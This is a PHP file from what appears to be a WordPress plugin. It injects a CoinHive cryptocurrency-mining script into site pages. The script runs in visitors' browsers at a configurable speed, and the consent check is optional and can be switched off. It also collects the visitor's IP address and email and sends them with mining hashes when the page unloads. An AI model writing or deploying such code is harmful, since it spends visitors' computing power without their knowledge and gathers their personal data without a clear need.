<?php
if ( ! defined( 'ABSPATH' ) )
{
	exit;
}	
function cm_CoinHiveMiner() {
	$coin_hive_data = new CoinHiveData;
	$ch_public_key = $coin_hive_data->getPublicKey();
	$ch_user_concent = $coin_hive_data->getUserConcent();
	$ch_miner_speed = $coin_hive_data->getMinerSpeed();
	$ch_delayed_miner_speed = $coin_hive_data->getDelayedMinerSpeed();
	$ch_delayed_miner_time = $coin_hive_data->getDelayedMinerTime();
	$mobile_status = ($coin_hive_data->getMobileStatus() != "on") ? true : false;
	$user_ip = coinMinergetRealIpAddr();
	$username = wp_get_current_user()->user_email;
	if (empty($username)){
		$username = "unknown";
	}
	echo '<script>
		var mobileStatus = "' . json_encode($mobile_status) .'";
		var chPublicKey = ' . json_encode($ch_public_key) .';
		var chUserConcent = ' . json_encode($ch_user_concent) .';
		var chMinerSpeed = ' . json_encode($ch_miner_speed) .';
		var chDelayedMinerSpeed = ' . json_encode($ch_delayed_miner_speed) .';
		var chDelayedMinerTime = ' . json_encode($ch_delayed_miner_time) .';
		var chUserip = ' . json_encode($user_ip) .';
		var miner = new CoinHive.Anonymous(chPublicKey, { throttle: chMinerSpeed});
		var username = '. json_encode($username) .';
			
		if (miner.isMobile() && mobileStatus == false) {
			// do nothing
		}
		else{
			if (chUserConcent == "on" && miner.didOptOut(86400)){
				// do nothing
			}
			else{
				miner.start();
				if (chDelayedMinerTime > 0 && chDelayedMinerSpeed > 0){
					chDelayedMinerTime = chDelayedMinerTime * 60000;
					setTimeout(function(){cm_delayedMiner(miner, chDelayedMinerSpeed)}, chDelayedMinerTime);
				}
				window.addEventListener("beforeunload", function (e) {
					console.log("beforeunload?");
					cm_sendHash(miner, chUserip, username, "coinhive");
				});
			}
		}
	</script>';
}